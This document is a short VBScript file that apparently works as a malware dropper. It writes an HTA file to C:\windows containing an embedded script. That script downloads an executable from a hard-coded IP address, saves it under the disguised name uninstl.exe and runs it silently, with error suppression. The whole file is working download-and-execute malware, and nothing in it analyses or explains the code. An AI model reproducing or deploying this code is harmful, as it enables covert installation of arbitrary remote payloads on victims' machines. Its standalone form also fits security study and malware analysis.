on error resume next
set evanchik = CreateObject("ADODB.Recordset")
   With evanchik
       .Fields.Append "evanchik", 200, "3000"
       Call .Open
       Call .AddNew
       .Fields("evanchik").Value = "<script language=vbscript>: on error resume next : set o = CreateObject(""msxml2.XMLHTTP"") : o.open ""GET"",""http://67.176.99.121:8180/006/start.exe"",False : o.send : set s = createobject(""adodb.stream"") : s.type=1 : s.open : s.write o.responseBody : s.savetofile ""C:\windows\uninstl.exe"",2 : Set ws = CreateObject(""WScript.Shell"") : ws.Run ""C:\windows\uninstl.exe"", 3, FALSE : </script>"
       Call .Update
   End With
evanchik.Save "C:\windows\test.hta", adPersistXML
evanchik.Close